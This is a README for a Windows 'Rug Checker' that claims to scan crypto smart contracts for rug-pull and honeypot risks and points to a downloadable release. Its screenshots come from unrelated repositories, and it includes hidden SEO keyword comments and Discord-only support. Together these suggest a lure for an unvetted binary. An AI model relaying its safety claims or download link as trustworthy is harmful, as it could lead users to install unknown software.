# SimpleRugPullDetector
Simple Rug Checker is a lightweight tool to detect rug-pull risks in smart contracts and tokenomics.

# 🛡 Rug Checker - Smart Contract Threat Scanner

Rug Checker is a lightweight Windows-based tool designed to scan and analyze smart contracts for potential rug-pull patterns, exit scams, and malicious behavior. With just one click, it identifies high-risk signs in tokenomics, contract permissions, and liquidity behavior.

---

## 🧠 How It Works (Windows Version)

Once you download and run the software on Windows:

1. **Smart Contract Input**  
   - You paste or upload the smart contract address (e.g., Ethereum/BSC chain/Solana).
   - The tool fetches and analyzes the verified contract code from explorers (like Etherscan).

2. **Static Code Analysis**  
   - Scans contract code for common rug-pull red flags:
     - Hidden mint functions
     - Owner privileges (e.g., disabling sell, draining funds)
     - Liquidity control access
     - Trading lock or delay mechanics

3. **Tokenomics Check**  
   - Evaluates token distribution, ownership percentage, and holder risk.
   - Detects suspicious transfers and whale wallets.

4. **Audit Report Generation**  
   - Generates a local HTML or TXT report summarizing potential risks.
   - Gives a confidence score (Safe / Medium Risk / High Risk).

5. **Optional: On-Chain Simulation**  
   - Simulates a few blocks of on-chain behavior (experimental).

---

## Features

- Checks for common rug-pull and honeypot indicators
- Real-time audit report
- Contract risk scoring system
- Local and anonymous – no data is sent to external servers
- Supports ETH SOL and BSC chains (more coming soon)

---

## Installation

1. [⬇️ Download the latest release](https://github.com/RugDetector/SimpleRugChecker/releases)
2. Paste a contract address and click **Scan**

---

## Screenshots

![UI Screenshot](https://raw.githubusercontent.com/rug-pull-checker/dasd/refs/heads/main/screen.jpg)

1. Detection Process
The detection process follows this sequence of operations:
![UI Screenshot 2](https://github.com/KeithTheDev/rugpulldetector/raw/main/images/sequence.png)
---

## Disclaimer

This tool provides static analysis and heuristics. It cannot guarantee complete safety. Always do your own research (DYOR) before investing in any token.

---

## Contact & Support

- Discord: daredevil_code#4524


---

<!-- Hidden Tags for SEO -->
<!-- Rug Pull Detector, Smart Contract Audit Tool, Crypto Security, Honeypot Checker, Token Scanner, Blockchain Risk Tool, Anti Rugpull Bot, Ethereum Audit, BSC Audit, Windows Contract Scanner, Solidity Risk Detection, Exit Scam Protection -->
